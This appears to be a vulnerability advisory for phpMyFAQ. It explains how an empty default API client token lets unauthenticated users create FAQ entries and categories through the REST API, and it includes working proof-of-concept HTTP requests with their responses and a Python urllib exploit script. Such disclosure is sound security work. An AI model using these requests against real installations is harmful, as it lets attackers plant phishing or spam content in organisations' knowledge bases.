summary: "phpMyFAQ: Default Empty API Token Authentication Bypass\n### Summary\n\nA default\
  \ empty API client token allows any unauthenticated user to create and modify FAQ entries,\
  \ categories, and questions via the REST API. The vulnerability exists in all versions since\
  \ API v4.0 was introduced because the installation process seeds `api.apiClientToken` with\
  \ an empty string, and the `hasValidToken()` comparison logic cannot distinguish between \"\
  no token configured\" and \"attacker sent a matching empty token header.\"\n\n### Details\n\
  \nThe root cause is in two files:\n\n**1. Installation default** (`src/phpMyFAQ/Setup/Installation/DefaultDataSeeder.php`,\
  \ line 277-278):\n\n```php\n'api.enableAccess'   => 'true',\n'api.apiClientToken' => '', \
  \      // ← defaults to empty string\n```\n\n**2. Authentication check** (`src/phpMyFAQ/Controller/AbstractController.php`,\
  \ line 198-204):\n\n```php\nprotected function hasValidToken(): void\n{\n    $request = Request::createFromGlobals();\n\
  \    if ($this->configuration->get('api.apiClientToken') !== $request->headers->get('x-pmf-token'))\
  \ {\n        throw new UnauthorizedHttpException('\"x-pmf-token\" is not valid.');\n    }\n\
  }\n```\n\nThe method uses strict inequality (`!==`). When `api.apiClientToken` is `''` (default)\
  \ and the attacker sends `x-pmf-token: ` (empty header value), the comparison becomes `''\
  \ !== ''` which evaluates to `false` — no exception is thrown, and authentication is completely\
  \ bypassed.\n\nThe OpenAPI annotations confirm the developer intended these endpoints to require\
  \ authentication: write endpoints are tagged `'Endpoints with Authentication'` and document\
  \ HTTP 401 responses, while read-only endpoints are tagged `'Public Endpoints'`.\n\nThe following\
  \ API endpoints call `$this->hasValidToken()` as their only authentication check:\n\n| File\
  \                                                    | Endpoint               | Method |\n\
  | ------------------------------------------------------- | ---------------------- | ------\
  \ |\n| `src/.../Controller/Api/FaqController.php:701-703`      | `/api/v4.0/faq/create` |\
  \ `POST` |\n| `src/.../Controller/Api/FaqController.php:857-859`      | `/api/v4.0/faq/update`\
  \ | `PUT`  |\n| `src/.../Controller/Api/CategoryController.php:278-280` | `/api/v4.0/category`\
  \   | `POST` |\n| `src/.../Controller/Api/QuestionController.php:89-91`   | `/api/v4.0/question`\
  \   | `POST` |\n\n### PoC\n\n**Environment**: phpMyFAQ 4.2.0-alpha, PHP 8.4.16, SQLite, installed\
  \ with all defaults.\n\n**Step 1 — Verify that requests without auth header are correctly\
  \ rejected:**\n\n```http\nPOST /api/v4.0/faq/create HTTP/1.1\nHost: <target>\nContent-Type:\
  \ application/json\n\n{\n    \"language\": \"en\",\n    \"category-id\": 1,\n    \"question\"\
  : \"Test Question\",\n    \"answer\": \"Test Answer\",\n    \"keywords\": \"test\",\n    \"\
  author\": \"test\",\n    \"email\": \"test@test.com\",\n    \"is-active\": true,\n    \"is-sticky\"\
  : false\n}\n```\n\nResponse (HTTP 401 — correctly blocked):\n\n```json\n{\"type\":\".../problems/unauthorized\"\
  ,\"title\":\"Unauthorized\",\"status\":401,\"detail\":\"Unauthorized access.\",\"instance\"\
  :\"/v4.0/faq/create\"}\n```\n\n**Step 2 — Send the same request with an empty `x-pmf-token`\
  \ header:**\n\n```http\nPOST /api/v4.0/faq/create HTTP/1.1\nHost: <target>\nContent-Type:\
  \ application/json\nx-pmf-token: \n\n{\n    \"language\": \"en\",\n    \"category-id\": 1,\n\
  \    \"question\": \"[POC] Authentication Bypass Confirmed\",\n    \"answer\": \"This FAQ\
  \ was created without any valid authentication token.\",\n    \"keywords\": \"poc,bypass\"\
  ,\n    \"author\": \"Security Researcher\",\n    \"email\": \"researcher@example.com\",\n\
  \    \"is-active\": true,\n    \"is-sticky\": false\n}\n```\n\nResponse (HTTP 201 — bypass\
  \ confirmed):\n\n```json\n{\"stored\": true}\n```\n\n**Step 3 — Category creation via the\
  \ same bypass:**\n\n```http\nPOST /api/v4.0/category HTTP/1.1\nHost: <target>\nContent-Type:\
  \ application/json\nx-pmf-token: \n\n{\n    \"language\": \"en\",\n    \"parent-id\": 0,\n\
  \    \"category-name\": \"POC_Category\",\n    \"description\": \"Category created via empty\
  \ token bypass\",\n    \"user-id\": 1,\n    \"group-id\": -1,\n    \"is-active\": true,\n\
  \    \"show-on-homepage\": true\n}\n```\n\nResponse (HTTP 201):\n\n```json\n{\"stored\": true}\n\
  ```\n\n**Step 4 — Verify injected content is publicly visible:**\n\n```http\nGET /api/v4.0/faqs/1\
  \ HTTP/1.1\nHost: <target>\n```\n\nResponse (HTTP 200 — injected FAQ publicly exposed):\n\n\
  ```json\n[{\"record_id\":1,\"record_lang\":\"en\",\"category_id\":1,\"record_title\":\"[POC]\
  \ Authentication Bypass Confirmed\",\"record_preview\":\"This FAQ was created without any\
  \ valid authentication token. ...\"}]\n```\n\n**PoC with Python (urllib — no external dependencies):**\n\
  \n```python\nimport urllib.request, json\n\nTARGET = \"http://<target>\"\nHEADERS = {\"Content-Type\"\
  : \"application/json\", \"x-pmf-token\": \"\"}\n\n# Create FAQ via empty token bypass\ndata\
  \ = json.dumps({\n    \"language\": \"en\", \"category-id\": 1,\n    \"question\": \"[POC]\
  \ Auth Bypass\", \"answer\": \"Created via bypass.\",\n    \"keywords\": \"poc\", \"author\"\
  : \"R\", \"email\": \"r@t.com\",\n    \"is-active\": True, \"is-sticky\": False\n}).encode()\n\
  req = urllib.request.Request(f\"{TARGET}/api/v4.0/faq/create\", data=data, headers=HEADERS,\
  \ method=\"POST\")\nresp = urllib.request.urlopen(req)\nprint(f\"Status: {resp.status}\")\
  \  # 201 — bypass successful\n```\n\n**Overlap Summary:**\n\n| Test                | x-pmf-token\
  \    | HTTP Status      | Result                     |\n| ------------------- | --------------\
  \ | ---------------- | -------------------------- |\n| No auth header      | *(not sent)*\
  \   | 401 Unauthorized | \U0001F512 Correctly blocked        |\n| Empty token header  | `\"\
  \"`           | **201 Created**  | \U0001F513 Bypass confirmed         |\n| Category creation\
  \   | `\"\"`           | **201 Created**  | \U0001F513 Bypass confirmed         |\n| Public\
  \ verification | *(not needed)* | 200 OK           | \U0001F4C4 Injected content visible |\n\
  \n### Impact\n\nThis is an **authentication bypass (CWE-1188)** affecting any phpMyFAQ installation\
  \ where the administrator has not explicitly set a non-empty API client token — which is the\
  \ **default state after installation**.\n\n- **Who is impacted?** Any organization running\
  \ phpMyFAQ with default configuration. The REST API is enabled by default, and the token defaults\
  \ to empty. No action by the administrator is required for the vulnerability to exist — it\
  \ is the out-of-the-box state.\n- **What can an attacker do?** Create and modify FAQ entries,\
  \ categories, and questions without any authentication. This enables content injection for\
  \ phishing, SEO spam, reputation damage, and distribution of malicious links through the knowledge\
  \ base.\n- **What is NOT affected?** Read-only API endpoints are intentionally public. Session-authenticated\
  \ admin endpoints are not affected. File upload and backup endpoints require separate session-based\
  \ authentication."
